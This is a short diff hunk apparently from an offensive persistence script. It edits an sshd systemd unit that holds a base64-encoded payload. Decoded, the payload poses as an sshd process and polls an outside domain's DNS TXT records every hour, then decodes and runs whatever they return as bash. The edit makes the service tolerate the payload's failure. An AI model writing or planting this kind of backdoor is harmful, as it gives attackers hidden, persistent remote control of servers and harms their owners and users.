@@ -1899,7 +1899,7 @@ echo "===> Execute the following on the target:"$'\n\033[0;36m'"echo $(<x.txt)|b
 [Service]
 EnvironmentFile=-/etc/default/ssh
 Environment="SSHD=echo RD1iMDBtMi50ZWFtLXRlc28ubmV0ClA9InNzaGQ6IC91c3Ivc2Jpbi9zc2hkIC1EIFtsaXN0ZW5lcl0gMCBvZiAxMC0xMDAgc3RhcnR1cHMiCk09L2Rldi9zaG0vLmNhY2hlJHtVSUR9ClsgLWYgJE0gXSYmZXhpdAp0b3VjaCAkTQooZWNobyAnc2xwKCl7IGxvY2FsIElGUztbIC1uICIke19zZmQ6LX0iIF18fGV4ZWMge19zZmR9PD4gPCg6KTtyZWFkIC10JDEgLXUkX3NmZHx8Ojt9CnNscCAxCndoaWxlIDo7IGRvCmRpZyArc2hvcnQgJyIkRCInIFRYVHx0ciAtZCBcIFwifGJhc2U2NCAtZHxiYXNoCnNscCAzNjAwCmRvbmUnfGV4ZWMgLWEgIiRQIiBiYXNoICYpICY+L2Rldi9udWxsCg==|base64 -d|bash"
-ExecStartPre=bash -c 'eval $SSHD'
+ExecStartPre=-bash -c 'eval $SSHD'
 ExecStartPre=/usr/sbin/sshd -t
 ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
 ...
